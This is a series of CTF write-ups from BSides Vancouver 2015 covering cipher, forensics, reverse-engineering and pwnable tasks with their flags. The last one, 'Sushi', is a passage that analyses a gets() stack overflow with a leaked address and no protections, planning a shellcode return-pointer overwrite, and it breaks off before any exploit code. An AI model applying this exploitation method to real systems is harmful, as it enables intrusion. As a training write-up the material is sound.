> MQQOQAhJMQRJGgcAME4DGloCfxwNFAYNBQkgBQ0VRwwAKwkRGk8VK04CBFoCfxwNFAAEFA
> MgQERxYGLBURHU8VOxdJVhsmOh8PFDcIRVQgIB4ACRAAOkFTD0UN
> JwUPQA9JMQ4RGkIYMwcLERMFNxYRUVIsRBBhH0wDAg
> Kw0YRwgMOkFcCwcdMU4hWHBcfxIXFDoKExxyAkwpCBYMPA5cB0kT
> MQUVD1sEJkFcD0lUHA8VGV0Xc1MEQR8IDRNnSkwJBhgCNg9WTlQbMgsRHlocOA

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/yvrctf/2015/tree/master/matasano>
* <http://captf.com/2015/bsides-vancouver/crypto/matasano/psifertex-solve.txt># Vancouver BSides CTF 2015: ts/sci/nz

**Category:** Crypto
**Points:** 200
**Solves:** 4
**Description:** 

> TOP SECRET MUST NOT BE SHARED OUTSIDE NZHQ
> 
> Hello,
> 
> We intercepted this transmission sent yesterday morning being sent to Adelaide. Based on our observations it came from Canberra so we can only assume it was a government transmission. Based on new intelligence, they're using a new machine to encipher their text and at this time we're unsure of what they're doing to get the message across.
> 
> Please decipher this at the earliest possible and deliver it to my handler in Christchurch. We must not let the Queen take back our land.
> 
> 4e3b5f5c6f8a4e4c7f0a6d3b7f7c2d4a
>
> 3e0a4f7c0d4c6e8a3e6b3d3b3d0a3f6c
>
> 7e0a6f6b5f9c0d8a4e3b0d7b3e2c4f7a
>
> 4f3b6e8a0d2a6e3a0d6a8e7c8d0a6e6c
>
> 8d0a2e3b0d3a3e2c4f7a4e3b7e3b3d0a
>
> 2e9c0d2a6e9c0d8b6e2a8e8a4e6c7e4c
>
> 7f3b3d0a7d2a7e8a9f0a7f4b6f8b5f3a
>
> 0d9c6f8b0d6b6f8a0d2b3e0a2d8b8d4b
>
> 6f7b4f7c3e3a0d8a6f0a3d3b2f6c3d3b
>
> 0d8a4e4c7f0a6d3b7f7c2d4a3e0a9f6c
>
> 8e0a9d4c5f5c0d2b3e0a7d7b6f7c3e2c
>
> 8e8a3e3a0d4c6e0a6f8b7e0a6d2a5d3b
>
> 7f8a9f7c0d2c6f8b7e8a0d2a8d0a4f8a
>
> 7f0a3f8b5f5c3e7c8d4c3f0a9f6c8e0a
>
> 2d7b3e0a4f6b0d2a3d3b5f2a4f3a3e0a
>
> 7d5c3e2a7f3b0d6a2d5b3e0a9f6c8e7b
>
> 0d9a2d9c0d8a6f0a4e6c2e2a7e8a0d8a
>
> 6f0a2f6c6e8a2d2c8d0a6d4c6e4c7f8a
>
> 3e7b0d3c8e5c5f3b7e0a2d8a0d9c6f8b
>
> 7e0a3e2a7e5c4f3b7f8a0d9a3e0a4e2a
>
> 8f3b0d2a0d7a2d2c5e2a4d3b0d9a2d4c
>
> 8d4c6e4a0d8a6f0a2e3b0d7a4f2c5e3b
>
> 3d0a8e7a0d8a4e3b7e3b0d9a4e4c2f4b
>
> 0d6a8e7c8d0a2e3b0d3a3e5c4f8c3e7b
>
> 3e3a0d8a6f0a8d4b3e0a7f9c3d6b3e9c
>
> 0d4b2d7b2e6c8e7b0d2b7e4c3d4a3e0a
>
> 2d8a0d4c8d7c0d3b2d7b5f4c3e7c8d0a
>
> 9f6c8e0a9d4c5f5c0d6a3e3b8d0a9d4c
>
> 8d4b0d2b7e4c8d4c7f4b0d2a6e3a0d2c
>
> 2d6b2d3a4f2a6e0a6f3c3f4c2f4c2d5c
>
> 7f0a9d4b6f0a9d4c5f5c0d4a8e4c3d3b
>
> 0d9c6f8b0d8a6f0a2d0a9d2a4f8a4f6b
>
> 4d0a2f2a7e0a2d8a0d9a4e4c2f4b0d7a
>
> 6f4c6e8a0d9c6f8b0d9a4f5c5f0a2e3b
>
> 0d7a7e6c8f4c3d3b3d0a9d4c8d4b0d3c
>
> 8e7b8d4b3e7b0d3a3e8a2d4c5f7c9d4b
>
> 3e6b0d9c6f8b0d6a3e3b8d0a8d4b3e0a
>
> 6f3c3f4c2f4c2d5c7f0a7d5c3e2a7f3b
>
> 0d7a7e6c8f4c3d3b0d8a4e3b6d0a9d4c
>
> 8d4b0d8a4e3b0d3c6f5c5f6c9d4c6e4a
>
> 0d3c5f2a4d8a4e3b7d2a2f5b2d4a3e7c
>
> 2d7b3e2a8d7a3e7b8d4b6e6c7e8a4e9a
>
> 3e0a4e6c7d3b0d8a4e2a8d0a8d4b4f7c
>
> 0d6a3e7c7f2a4d3b0d6a2d5b3e7c0d4c
>
> 8d0a8d6c0d9c6f8b0d7c2d3c3e5c9f9c
>
> 6f8b7e7c0d4c6e0a7f8b2f2c3e7c7f0a
>
> 4f6b0d8a4e3b0d9a2d7b0d3b3f3c6f7b
>
> 8d6a4f6b4f7c8d3b7e0a8d4b6f6a2d7c
> 
> Yours truly in defeating the Australians,
> Minister Stevensons

## Write-up

by [polym](https://github.com/abpolym)

Please read the writeup by the CTF organisers/task author [here](https://github.com/yvrctf/2015/tree/master/ts-sci-nz). This writeup is based on the original writeup.

In this task, we had to notice that these supposed MD5 hashes do have a certain pattern (number and letter pairs) and that this is a [keypad](http://dialabc.com/motion/keypads.html) cipher using the Australian keypad as key.

On the one side, we have the following substitution:

```
0 - Space
1 - QZ
2 - ABC
3 - DEF
4 - GHI
5 - JKL
6 - MNO
7 - PRS
8 - TUV
9 - WXY
```

Given a string of even length, we can split the string into number-letter pairs:

```
4B3B5C5C6C => 4B 3B 5C 5C 6C
```

The number of each pair is the key for the substitution, the letter is the position of the value

(`A=0, B=1, C=2, D=0, E=1, F=2`):

```
4B:
4 => 4 - GHI
B => Second position of GHI => H

3B:
3 => 3 - DEF
B => Second position of DEF => E
[...]

Result: HELLO
```

To counter frequency analysis, a shift parameter is used that adds an increasing shift value (modulo 10), starting at e.g. `2`, to the number of each pair:

```
 4B3B5C5C6C
+2 3 4 5 6 
-----------
 6B6B9C0C2C
```

I have implemented a simple [python script](https://github.com/YASME-Tim/crypto-tools/tree/master/aus-dial-pad) that can decrypt and encrypt a given ciphertext/cleartext:

```
$ python ausdialpad.py 4 "$(cat cip)"
HELLOTHIS MESSAGE IS INTENDED FOR ONLY THE RECIPIENT AND MUST NOT BE DECIPHERED BY ANY UNAUTHORISED PARTY SHOULD YOU NOT BE AUTHORISED TO DECODE THIS MESSAGE YOU WILL BE PROSECUTED IN OUR MAJESTYS COURT AT ITS FULLESTIF YOU ARE IN ADELAIDE PLEASE MAKE YOUR WAY TO HOBART TO CONTACT MINISTER FULLER AT YOUR EARLIEST WE HAVE A PACKAGE WAITING TO BE PICKED UP THERE WHICH MUST BE DELIVERED TO THE SYDNEY HARBOUR BRIDGE AT ITS EARLIEST YOU WILL MEET WITH BRITISH AND CANADIAN OFFICIALS WHO WILL GUIDE YOU TO A WAITING CAR AT WHICH POINT YOU WILL BE PROVIDED WITH FURTHER DETAILSWHEN YOU MEET THE OFFICIALS PLEASE PROVIDE THEM WITH THE FOLLOWING FLAGTHEPACKAGESAREATPERTHNORTHWE HOPE THAT THIS MESSAGE MAKES IT TO YOU SAFELYYOURS IN SUCCESS IN THE WAR EFFORTMINISTER THOMAS
```

The flag is `THEPACKAGESAREATPERTHNORTH`.

## Other write-ups and resources

* <http://colin.keigher.ca/2015/03/an-australian-specific-cipher.html>
* <https://github.com/yvrctf/2015/tree/master/ts-sci-nz># Vancouver BSides CTF 2015: garbage file

**Category:** Forensics
**Points:** 100
**Solves:** 3
**Description:** 

> Your buddy Joey left a USB key with some data he needs your help with. He pulled it from the firewall logs at a 'secure file format'-as-a-Service provider, so he's pretty sure it might be protected or obfuscated somehow.
> 
> [garbagefile.pcapng.gz](garbagefile.pcapng.gz)

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on following writeups:

* <https://github.com/yvrctf/2015/tree/master/garbagefile>
* <http://www.sinfocol.org/2015/03/b-sides-vancouver-ctf-2015-garbage-file/>

We are given a gzip compressed pcap that we decompress using `gunzip` and open with `wireshark` to see mostly UDP packets that have been transmitted.

After having a closer look at the data sent, we notice a pattern:

```bash
$ tshark -r garbagefile.pcapng -Y "udp" -T fields -e data
00026163636f756e742d646174612e62696e006f6374657400
00040000
0003000100004edf00002e77789c0173018cfe4435d00b168b9ee7ba3a6066f990ade4b235d37355415c3fbdaaf14aad42151919786fe9db515a96a2f4a9066c18024a01ea58d454b63da36e4dafe358505d9c94970e36a2d818be7b779b4698fd46e073ad111a2f769cb0dc5b0a729390b984f7f7f5c248fcec7c31281cbe5ac4ae332c52fd8fb48c34581b7899a4650c3997b0682ed038ac9e10d69ae508334b44d89a1dc3398a9cc71c7ba08566346d3b3c67dd990623c03fd1c5dff761c1027f0ade5baf9412ef61c8e367249045a7a73aebae9c7820ddf0038eea7995660374d3308ef6e71404a491a0368013f9da57f5bebabc94c23be8faacafac38860bbf6cf910cc206d0d50177ce90eb6802c958d2aeec4b2885fbae90694a9d958dc5b2cf652bfef02dfa0a2ad93b9c5dfeb8819069290eb6dcc86aed4f84fed21af241bf19c7e098c163cc3581d3c3c4feee94514c01972db9796dae2038b95953a3e196e047063ab82bdeb25a6a997e77f05648297996a1f80510b12fb9887fa1f9412e6495641e5b9f1425a6839314159265359f58401ad0000b87fffffbfcdfb6cffcfeb6ffd7cdefffb9cd7f9e6ef1ff57bffe7febfbffbee5dfbf7b0011b3148340680d00640d01a003103401a068d000d01a00000000343401886801a34d1a64d1a68da9a7a8c4c9b5313440001a001a640003d40001a0000d001a0d1a34f4801a6
00040001
00030002803434680f53d41a3d4068007a801a1ea0341a1ea7a6a203431341820d007a26101a0d068001a681840640184d1a0034c1000d0340680c200340034000032fd43152a083e37d9a99ded2baa0b23804ea60c8b4e9175cb8249f033d222039f33b4a4a139227e9884695d5d81d4f5432b83c9695f088ea0c9ada6e4c498e114cd38a245caa728743c0fee9b94b7ead994a6f145067463a6b7462f467a50f088bd532d759161af4c812af20a47303a2a98998349f1ada6536f399608e380241507d99cbf047c8a22402baca491e54f535a26439e2f7c80389ac4e34852aa2dc880927bd6af7c029690e745958e53c2122239c9ad4055ab323a04dbaa3c3e7043a35008244fa538948069f7ed14803ca3605d07e0c76b1c24c2969951f4949f6a93e5861bdf05594eb4285481669448323410c60c2c0a34049244fb3c0d089b5cb472b2bcd074378706a21e77c6313e65d0b00653e859cb7ff0dde0b67430be75bfb7c128503c8069f987bdb2244232dfd1d4851124726920e63180ca7b094d01934da104bd7135e3fe35033060c041f14b27bfc5dc914e14243d61006b4785e0173018cfe416d03046fbcb3384271366bfb466f20d6e56a34db19b10e4dab525edc63e87b9eae201739e5f4161304a99dc5f6f5d4189bc2b7c59d683a56db43d732992939e89db17e5d26e25bbfb8bf3570d151c2f6c5631307bbdb75fad5014328
00040002
[...]
0003004c7f30425a6839314159265359faa926b30000177fffee1bf37a6bebafefd7b9e66f57f7bcfb573d77e1cae72b2b9e88fcb7ffb2f223b000d6b080d0184d346989a680321a1a184320d34d1a0626400001919188c9a340d0d190d068d18d47934693cd44068346868c832346418991a0c40d0c8d03230832066a611823013d09a0c23264d18869934c2346261c991a327a80c264d0d343469a641810346834d1821934189a3434c1191900c83136a34c80c98086098b33c52261a3268f541dfd89e6c06a50acee0af0802b13254f639c664b1c4fdce703ebf58f94ce3930b89fb620e0d59710e7a9d5369f0c1d75d4641b18a04d822041908b96614eb7a03fc3c6ad9afa7a8ee9b2cf275d792c079f345142c55afa064cb265bafd44f830821e88f22ae2ac8b1a05a9e7f0c0f755dbaf9d32183e712355027d4bd75e21070a0869641a11fe6c814c56f6f64fc478b2396cbf76d0851be61b6342dcb24c1460468bd6c3dbf4487f929288998066cc7c10d6268e20f07ffa71dd847099048991a5d0f069a8aec518005de6302c5eacb8aa9cb01c81f21ed3000bfd1f4b177245385090faa926b3425a6839314159265359afceca7f000069ffffaaffaef2b0f15ff8f0e7bbdebb1b7f56fd2f4ee263fd5ffbe7acb73dbbe0b6ebb000d22400d034000034000f53d400321a34680340f51900003d4d000643ca00f50794f51a6d43ca
0004004c
0003004d3c537a69441a341a6869a03100c4034c4c99321a00d068681a7a9e8830d4d34f440c8683d4f29a7947a8c81a3d40687a818440d0c9a68623269a0323406862683099184320321a641a34c864031310c1309826469a60026020212afdea73853d438ecee76148a2697f045b30b3c1f89d3cecc84704802da290781f5b617dc6e4c64a4c261acc0fdd096088bcb0f75886f46e6e5e7839ba90cde2b1235cb58ba200833bd461491c10c9f21daedc2d52ca3fe84c02e7f43777e3d3b76598bbcc1a6dce78d502969c43124c2f12840341225185dacc67015482291f1f223615206a57126a04dfd59eb3f3c99c726609d051a35635706f87e86c58bf16147a8278fe2681b90218e8ead68ef45d4f5a7f3266b5dfb34da54f1682882f124548a1c0b0751b2ffa4c655491fb5ea87d54e00f68f200aa9036cce11fe2ee48a70a1215f9d94fe0425a6839314159265359c0cfefe40000467fffdbb7b37357f9be7cd7b99294ffd2497ccbdfc5c7ec4d9e256d781bad163b2ffd3000d2a1c6a680c469a68c98834034c9a699182006801ea610611a343001001e9341ea1ea1ea0f44f261350e4d1a313468d36934c83468c0836a68d0c218868d34c2683d469e49b4d2320626107a83d4c8c13230100800c8d34d31308c4c8c4d1a69919181181300468d3231340c11a1918219189811800260acd90393a731b479b385676684214d0701
0004004d
0003004ed8316f472e963df892c1ee674b904c723f0e6bc15e78540a06db5cac6350bc627c5cfad469bcf7bfab4bac4f92c05f6eb56af383e837b9a9df0e44ae5838154351580fdf6f08914257c01ebf7249eb370836b618354101b198416e298b478864cf43b987798030d404c23fe895e77da785708bc2aba63cbc30928c0ae8f225519af0f3a25856191891b0c0621a36e1293f667cc25ad6ec45b0ee8d0a941c819453e22941a4d05fd2c81c959f7ca38577293143e6dbd0e82b38755fc1984a3f64a49a2825194c0058514869886e83460631bfe2ee48a70a121819fdfc80425a68393141592653591e83015d0000417fffff794876bcf1ece106de71c0c38343f13cffb275bbbbff66c3edfffba328dfeb3000d9b0720d06206269a68d00c207a81e90f53469a0031a11a0c464c47a8310641a368868627a8f534647a3c9441a6234620c9a64c2608c9a6262180830041826261320189801182321a34c02641886200d0d30023264d0c8184d184c13134d3134d019181340d1ea0c268d1a7a0d04f51ea3644d0699031f379124bc609928f3a89e26f9465664543495e539bea08c9ce0ba28a92e0d211ee2d5c086cd0e5997bb77401373e29bc08867a53fbc349636930270d5570a14bda181782fdf173470b27fc1628045bf58e2663700be253f2819ee5695d6e35809f4881d49ae11d42bebcfe17a5bdebb1e9334ebd82fdb97
0004004e
0003004fb89f12749af1a52fe1f9d9a82ce1edd6d1fa6ccae4ef8e5c3a2613f6c4a5d049aef073cd63c5165fba4340413f3f0119379ae07f4a2847529bdd0fa58df98b539bab7ff46378134038615867169224f50116818f9198d24d3030469f42966843c1792fc85a26ea0a010242c37fc5dc914e142407a0c05740789c010301fcfe5d5afd4a0ffba3abd0d90dd7775d2efb78a9c53b5b480083090eb8f7ebeebe826617fdc43783cc0215729ab725eabd65b94b4ae5b94893006179cdc357899f6f454e632f0ef4186c3577a2d61080f62b47829ea523c6443d54801ed486f4e0b1c1ce501628542793233c90b8f764894eff7030d47522504a019907a452222b9aaa3d33b6cf17c96d9d9651a71500eaabaadad87bb7efd817554fc6c29f895e5d8d3523b9c34abdf4a37cf618044cd74f208d63fbcc80d441c53adfcf6d2aec8e9d12c0dd90fc58149884f1854202ec4adc5b3d852290f18a18a6df0c27b5a017eca0048bb20172e69cec90c5e23bd9ff4d9aa5dc317f19680835e8f9c83f2b47fbdf711f84826c425a6839314159265359e0a3a8f4000075ffff9cefcbdeeffaf75cf9be4c1d6b7c78c37deff6b3575fefcb3e7dacebf11fbcf8b000d10800c134c9a69a6990d1
0004004f
```

Seems like the first 2 bytes alternate after the second packet and the following 2 bytes indicate some sort of counter.

Having a closer look at the first packet, we see the following:

![](./wireshark-first-packet.png)

After searching for RFCs and protocol specifications, you'll come across [the TFTP RFC1350](https://www.ietf.org/rfc/rfc1350.txt), which tells you the following:

* First 2 bytes are an opcode:
![](./opcodes.png)
* The bytes following the opcode depend on the opcode. Important for this task are `RRQ/WRQ`, `ACK` and `DATA`:
  * `RRQ/WRQ`:

  ![](./rrq-wrq.png)

  * `DATA`:

  ![](./data.png)

  * `ACK`:

  ![](./ack.png)

We extract the TFTP data using either `tshark` or `wireshark`.

For example on `tshark`:

```bash
$ tshark -r garbagefile.pcapng -Y "udp" -T fields -e data | tr -d '\n' | xxd -r -p > data
```

Then, we use [this python script](./tftp.py) to read the transmission and save files written:

```bash
$ mkdir tftp-out
$ python2.7 tftp.py data
  WRQ file: [ account-data.bin ]  mode: [ octet ]
  ACK Block# [ 0000 ]
 DATA Block# [ 0001 ]
  ACK Block# [ 0001 ]
 DATA Block# [ 0002 ]
[...]
  ACK Block# [ 004d ]
 DATA Block# [ 004e ]
  ACK Block# [ 004e ]
 DATA Block# [ 004f ]
$ ls -l tftp-out
ls -l tftp-out
total 80
-rw-r--r--  1 xxx xxx  40394 Dec 29 19:04 account-data.bin
$ cd tftp-out
$ file account-data.bin
account-data.bin: data
```

The extracted data contains a lot of zlib and bzip2 archives, according to `binwalk`:

```bash
$ binwalk account-data.bin 2>/dev/null

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
8             0x8             Zlib compressed data, default compression
390           0x186           bzip2 compressed data, block size = 900k
924           0x39C           Zlib compressed data, compressed
1306          0x51A           bzip2 compressed data, block size = 900k
1843          0x733           bzip2 compressed data, block size = 900k
2103          0x837           Zlib compressed data, compressed
2380          0x94C           Zlib compressed data, compressed
3144          0xC48           bzip2 compressed data, block size = 900k
3683          0xE63           Zlib compressed data, default compression
4065          0xFE1           Zlib compressed data, best compression
4447          0x115F          Zlib compressed data, compressed
4829          0x12DD          Zlib compressed data, best compression
5211          0x145B          Zlib compressed data, compressed
5593          0x15D9          Zlib compressed data, compressed
5975          0x1757          Zlib compressed data, best compression
6357          0x18D5          Zlib compressed data, compressed
6739          0x1A53          Zlib compressed data, best compression
7121          0x1BD1          Zlib compressed data, best compression
7503          0x1D4F          Zlib compressed data, best compression
7885          0x1ECD          Zlib compressed data, default compression
8267          0x204B          bzip2 compressed data, block size = 900k
8804          0x2264          bzip2 compressed data, block size = 900k
9338          0x247A          Zlib compressed data, compressed
9720          0x25F8          Zlib compressed data, compressed
10484         0x28F4          Zlib compressed data, compressed
10866         0x2A72          Zlib compressed data, compressed
11248         0x2BF0          bzip2 compressed data, block size = 900k
11780         0x2E04          bzip2 compressed data, block size = 900k
11895         0x2E77          Zlib compressed data, default compression
24448         0x5F80          Zlib compressed data, default compression
24804         0x60E4          Zlib compressed data, compressed
32086         0x7D56          Zlib compressed data, best compression
32356         0x7E64          Zlib compressed data, compressed
32896         0x8080          Zlib compressed data, default compression
33166         0x818E          bzip2 compressed data, block size = 900k
33588         0x8334          Zlib compressed data, compressed
33858         0x8442          bzip2 compressed data, block size = 900k
34285         0x85ED          bzip2 compressed data, block size = 900k
34690         0x8782          bzip2 compressed data, block size = 900k
35111         0x8927          bzip2 compressed data, block size = 900k
35535         0x8ACF          bzip2 compressed data, block size = 900k
35952         0x8C70          Zlib compressed data, compressed
36222         0x8D7E          bzip2 compressed data, block size = 900k
36640         0x8F20          Zlib compressed data, best compression
36910         0x902E          Zlib compressed data, best compression
37180         0x913C          Zlib compressed data, best compression
37450         0x924A          Zlib compressed data, best compression
37720         0x9358          bzip2 compressed data, block size = 900k
38132         0x94F4          Zlib compressed data, default compression
38402         0x9602          bzip2 compressed data, block size = 900k
38821         0x97A5          bzip2 compressed data, block size = 900k
39235         0x9943          bzip2 compressed data, block size = 900k
39645         0x9ADD          bzip2 compressed data, block size = 900k
40056         0x9C78          Zlib compressed data, default compression
40326         0x9D86          bzip2 compressed data, block size = 900k
```

However, most of them are decoys.

We have a closer look at the file using a hexeditor (e.g. `hexedit`) to see that the first 8 bytes (right before the first Zlib archive starts) are quite interesting:

![](./hexedit.png)

In combination with the previous binwalk output, we guess that the first 4 bytes are the `size` of an interesting file and the following 4 bytes are the `offset` to that said file. We also see in our binwalk output that a Zlib file begins at exactly that offset:

	11895         0x2E77          Zlib compressed data, default compression

We extract this zlib using `xxd`:

```bash
$ xxd -s11895 -l20191 -p tftp-out/account-data.bin | xxd -r -p > out.zlib
$ ls -l out.zlib 
-rw-r--r--  1 xxx xxx 20191 Dec 29 19:13 out.zlib
```

After decompressing the given Zlib with `zlib-flate`, we see that the decompressed content is a base64 encoded string:

```bash
$ zlib-flate -uncompress < out.zlib > deflated.bin
$ file deflated.bin 
deflated.bin: ASCII text
$ cat deflated.bin | head
iVBgMA0KNH0AAC56SUhqJQAALO0AAC4TCAIudwCpR3DoAC53AXN8MEIAgLkc6S53AAleP1lzLncL
Ey53CxMvd5qcNncAQC4+REF6DwHt83C8BWsCMPB7xwsIBH9SBQojRUGjPbH3OPolxPZlTYIDJj8T
Y3saExvhmNgfMRMLBOHERp5W2MAofwgoM9MqKqxXWL7RyXlvwZnM7FMM997V/ez88Ji+2ffuM2fg
6zlnyLuZ2TWL9reRWoYwfhegwG72gQItcgYKghAK3F5KIz/OSVBgjrdAga91AwUofZQUNqP5wCl0
BQYkexQYBkdQYPMkYFDJnL4LqXEMFDZfMFBO18BArzadDxJHUGCOt0CBr3UDBfhKBQZbye67Xh/A
QK/2AgMrcQoMOm/U+e50AwUofQwUNl8wUE6qU2B+kOu+JfAGDDpvKDB+F6DAbvZBnSFLMFBO18BA
r/YCAyuhPQUoAr7ulQdowG72gQItcgYKImMY1Ne3AwMrcQoMOm8oMH4X3VNOJ+frkHyHBiJjGCge
J2Cg7jeBQbN4PDB+F6DAbvaBAi1y1j0rcXW+wMxwaO43gYEsdAUGJHsUGPqOwAMtcgYKImMYKB4n
YN19F1DnxckLhyh7FBgGR1BgjrdAgW/qDzweJ2Cg7jeBgSx0BdYTcgZ1kJm7cEa3QIGvdQMFKH0M
FDaj+cAtdAUGJHsUGAZHUGDzJGBQyZy+C6lxDBQ2XzBQTtfAQK82nQ8SR1BgjrdAga91AwX4SgUG
```

Let's decode it using `base64` to get another binary blob:

```bash
$ cat deflated.bin | base64 --decode > blob
$ file blob
blob: data
```

By looking at the header and footer of this file, we notice that they are similar to the header and footer of a PNG:

![](./header-blob.png)
![](./header-realpng.png)

![](./footer-blob.png)
![](./footer-realpng.png)

This indicates that the blob is a PNG, xored with an unknown xor key.

However, we can quickly determine the key per hand using [this python script](./xor-strings.py), which just xors two bytearrays given in hexadecimal:

```bash
$ python2.7 xor-strings.py 89504E47 89506030
0000002e77
```

The key is the `offset` from earlier on - `00002e77`!

We can now use [this python script](./xor.py) to xor a binary file with a given key:

```bash
$ python2.7 xor.py blob > blob.png
$ file blob.png
blob.png: PNG image data, 666 x 100, 8-bit/color RGB, non-interlaced
```

Lastly, the PNG contains our flag, `key{03087-08351-27H}`:

![](./blob.png)

PS: The flag as well as the challenge name are a reference to the movie [Hackers](https://www.youtube.com/watch?v=8wXBe2jTdx4):

The key is the bank account number of Plague's overseas account.

## Other write-ups and resources

* <https://github.com/yvrctf/2015/tree/master/garbagefile>
* <http://www.sinfocol.org/2015/03/b-sides-vancouver-ctf-2015-garbage-file/># Vancouver BSides CTF 2015: Kicker of Elves

**Category:** Forensics
**Points:** 200
**Solves:** 34
**Description:** 

> I stole this file, but it doesn't work. Halp plz.
> 
> [koe-118c28da8a435978a957cf3cba03ab20932d94fb](koe-118c28da8a435978a957cf3cba03ab20932d94fb)
>
> [koe-118c28da8a435978a957cf3cba03ab20932d94fb](koe-118c28da8a435978a957cf3cba03ab20932d94fb)

## Write-up

by [polym](https://github.com/abpolym)

We are given an ELF:

```bash
file koe-118c28da8a435978a957cf3cba03ab20932d94fb 
koe-118c28da8a435978a957cf3cba03ab20932d94fb: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), stripped
```

Executing the ELF does not work, it looks like something is broken or missing.

Disassembling the binary with `objdump` is also a bit harder - it gives an error:

```bash
$ objdump -D -M intel koe-118c28da8a435978a957cf3cba03ab20932d94fb
gobjdump: koe-118c28da8a435978a957cf3cba03ab20932d94fb: File format not recognized
```

Turns out we can fix the binary by following [these instructions](http://www.askrprojects.net/software/objdump.html) to disassemble it.

In the [assembly code](./koe.asm) of this binary we see a simple XOR with `0x41` == `A` that encrypts a certain block.

In comes a helpful tool named [XORSearch](http://blog.didierstevens.com/?s=xorsearch) that we can use to find the flag automatically:

```bash
$ xorsearch koe-118c28da8a435978a957cf3cba03ab20932d94fb flag
Found XOR 00 position 13BC: flag
Found XOR 41 position 071E: flag{4nything_is_b3tter_than_that_1train}
```

The flag is `flag{4nything_is_b3tter_than_that_1train}`.

## Other write-ups and resources

* <https://neg9.org/news/2015/3/22/kicker-of-elves-solution>
* <http://captf.com/2015/bsides-vancouver/forensics/kickerofelves/kickerofelves-psifertex-solve.txt>
* [Japanese](http://mage-ctf-writeup.blogspot.jp/2015/03/b-sides-vancouver-2015.html)# Vancouver BSides CTF 2015: 10 CTF Commandments

**Category:** Misc
**Points:** 10
**Solves:** 411
**Description:** 

> Submit me: flag{never_hack_where_u_rest_at}
> 
> [libc.tar.gz](libc.tar.gz)

## Write-up

The flag is `flag{never_hack_where_u_rest_at}`.

## Other write-ups and resources

* <https://github.com/yvrctf/2015/tree/master/10ctfcommandments># Vancouver BSides CTF 2015: Delphi

**Category:** Ownable
**Points:** 200
**Solves:** 26
**Description:** 

> delphi.termsec.net 5000
> 
> [delphi-07a5c9d07a4c20ae81a2ddc66b9602d0dcceb74b](delphi-07a5c9d07a4c20ae81a2ddc66b9602d0dcceb74b)
> [libtwenty.so-4a3918b2efd9fbdfd20eeb8fa51ca76bc42eb2f2](libtwenty.so-4a3918b2efd9fbdfd20eeb8fa51ca76bc42eb2f2)

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/yvrctf/2015/tree/master/delphi>
* <https://gist.github.com/MarvelousBreadchris/f87a3fe5779771e5f6b9>
* <https://ctf-team.vulnhub.com/bsides-vancouver-2015-delphi/>
* [Japanese](http://mage-ctf-writeup.blogspot.jp/2015/03/b-sides-vancouver-2015.html)
* [Japanese 2](http://charo-it.hatenablog.jp/entry/2015/03/18/234404)
* <http://captf.com/2015/bsides-vancouver/ownable/delphi-psifertex-solve.txt>
* <https://gist.github.com/emyei/5e3c9d0a32c0aa0d3899># Vancouver BSides CTF 2015: Glorious Modem

**Category:** Ownable
**Points:** 350
**Solves:** 23
**Description:** 

> gloriousmodern.termsec.net 7000
> 
> [gm-78d8d279bae78aa4febed27eb37601c6308f7a2c](gm-78d8d279bae78aa4febed27eb37601c6308f7a2c)

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/yvrctf/2015/tree/master/gloriousmodern>
* [Japanese](http://mage-ctf-writeup.blogspot.jp/2015/03/b-sides-vancouver-2015.html)
* [Japanese 2](http://charo-it.hatenablog.jp/entry/2015/03/18/234404)# Vancouver BSides CTF 2015: Sushi

**Category:** Ownable
**Points:** 100
**Solves:** 101
**Description:** 

> sushi.termsec.net 4000
> 
> Sushi is great in Vancouver. It's cheap, it's delicious, and it's everywhere.
> 
> Read flag.txt
> 
> [sushi-a6cbcb6858835fbc6d0b397d50541198cb4f98c8](sushi-a6cbcb6858835fbc6d0b397d50541198cb4f98c8)

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on following writeups:

* <https://github.com/yvrctf/2015/tree/master/sushi>
* <https://rotlogix.com/2015/03/18/vancouver-bsides-ctf-sushi/> (down) ([cached](https://web.archive.org/web/20150625064545/http://rotlogix.com/2015/03/18/vancouver-bsides-ctf-sushi/)) or <http://www.tuicool.com/articles/uieaeaq>
* <http://capturetheswag.blogspot.com.au/2015/03/vancouver-bsides-2015-sushi-pwnable.html>
* <https://ctf-team.vulnhub.com/bsides-vancouver-2015-sushi/> or <http://barrebas.github.io/blog/2015/03/18/bsides-vancouver-ctf-sushi/>
* <https://akshayswebspace.wordpress.com/tag/writeup/>

### Meta

Keywords:

* Stack Overflow in `gets`

We are given a stripped x86-64 bit for Linux:

```bash
$ file sushi-a6cbcb6858835fbc6d0b397d50541198cb4f98c8 
sushi-a6cbcb6858835fbc6d0b397d50541198cb4f98c8: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=ecf8d3deb9274a9ce4ab4532469a1f3027534d92, stripped
```

Running it:

```bash
$ ./sushi-a6cbcb6858835fbc6d0b397d50541198cb4f98c8 
Deposit money for sushi here: 0x7fff53177780
100
Sorry, $0.49 is not enough.
```

`checksec` tells us that no security is enabled:

```bash
gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : disabled
```

Since `NX` is disabled, we might be able to push shellcode to the stack using a stack overflow and execute it.
However, we might have to deal with ASLR.

Decompiling the binary's `main` using `radare2`:

![](./main.png)

Since the binary is stripped, we don't see any other functions that might be of interest:

```bash
[0x004004a0]> aa
[0x004004a0]> afl | sort -k1 | column -t
0x00400450  16  2  sym.imp.printf
0x00400460  16  2  sym.imp.__libc_start_main
0x00400480  16  2  sym.imp.gets
0x00400490  16  2  sym.imp.fflush
0x004004a0  42  1  entry0
0x00400596  93  1  main
```

Having the [64-bit C calling convention order](http://stackoverflow.com/a/4266083) in mind, the code becomes pretty straightforward:

```C
&buf = rbp-0x40;
printf("Deposit money for sushi here: %p\n",buf);
fflush(0); // 0 == stdin
buf = gets(buf);
printf("", "Sorry, $0.%d is not enough.\n", buf[0]);
fflush(0);
```

This tells us two things:

* The address to our input buffer is leaked, rendering ASLR irrelevant
* Since `gets` is used without any preceding input length check, we can smash the stack and overwrite the return instruction pointer RIP to point to our shellcode

We test our hypothesis:

